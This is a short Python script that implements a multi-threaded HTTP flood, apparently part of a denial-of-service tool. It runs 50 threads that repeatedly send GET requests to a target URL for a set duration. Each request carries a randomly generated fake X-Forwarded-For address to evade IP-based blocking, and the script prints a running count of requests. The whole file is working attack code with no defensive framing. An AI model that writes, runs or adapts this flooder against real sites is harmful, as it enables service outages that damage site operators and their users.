import threading
import requests
import random
import time
from colorama import Fore, Style

def fake_ip_flood(target_url, duration):
    timeout = time.time() + duration
    sent = 0

    def attack():
        nonlocal sent
        while time.time() < timeout:
            fake_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            headers = {
                "X-Forwarded-For": fake_ip,
                "User-Agent": "VampireBot/1.0",
                "Host": target_url
            }
            try:
                requests.get(target_url, headers=headers, timeout=5)
                sent += 1
                print(f"{Fore.BLUE}[Fake-IP] Sent from {fake_ip} | Request #{sent}{Style.RESET_ALL}")
            except:
                continue

    threads = []
    for _ in range(50):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(f"{Fore.GREEN}[+] Fake IP Flood Completed. Total: {sent}{Style.RESET_ALL}")
